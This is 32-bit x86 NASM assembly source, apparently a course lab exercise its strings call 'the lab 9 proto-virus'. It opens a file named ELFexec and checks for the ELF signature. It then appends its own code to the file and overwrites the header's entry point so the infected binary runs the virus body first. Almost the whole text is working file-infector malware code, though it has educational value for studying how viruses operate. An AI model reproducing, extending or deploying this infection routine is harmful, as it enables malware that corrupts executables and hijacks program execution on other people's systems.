%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28

%define FD dword [ebp - 4]
%define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 

	global _start

	section .text


checkELF:
	; Checking if file is an elf file
	mov FD, eax
	lea ecx, [ELF_header]		; Grabbing the effective address of elf header
	read FD, ecx, ELFHDR_size			; [ELF_HEADER] = E L F ........ ENTRY 
	lea esi, [ecx]
	cmp dword [esi], 0x464C457F
	jne not_elf

	; file is an ELF file, so we'll infect it
	jmp infect

infect:
	; Print Outstr to STDOUT
	call get_my_loc
	sub ecx, next_i - OutStr
	write 1, ecx, 32

	; Infect the file
	lseek FD, 0, SEEK_END
	mov esi, eax				; save file size in esi
	call get_my_loc
	sub ecx, next_i - _start
	mov edx, virus_end - _start
	write FD, ecx, edx

	; Modify entry point
	lseek FD, 0, SEEK_SET
	mov eax, 0x8048000 			; ELF base address
	add eax, esi 				; Set eax to end of file
	mov dword [ELF_header + ENTRY], eax
	lea ecx, [ELF_header]		
	write FD, ecx, ELFHDR_size	; Writing the modified header

	close FD
	jmp VirusExit

not_elf:
	close FD
	call get_my_loc
	sub ecx, next_i - Failstr
	write 1, ecx, 12
	exit -1

_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START

	call get_my_loc
	sub ecx, next_i - FileName
	mov esi, ecx
	open esi, RDWR, 0x777
	cmp eax, 0
	jg checkELF ; OF, SF, ZF
	jmp infected

infected:
	; Print Outstr to STDOUT
	call get_my_loc
	sub ecx, next_i - OutStr2
	mov esi, ecx
	write 1, esi, 37
	close FD
	jmp VirusExit

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
error:
	call get_my_loc
	sub ecx, next_i - Error
	mov esi, ecx
	write 1, esi, 5
	exit -1

FileName:	db "ELFexec", 0 ; default was with 1 but you gave us the file without it
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStr2:	db "The lab 9 proto-virus strikes back!", 10, 0
Failstr:    db "perhaps not", 10 , 0
Error:		db "ERROR", 10, 0


get_my_loc:              ; puts location in ecx
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit
virus_end: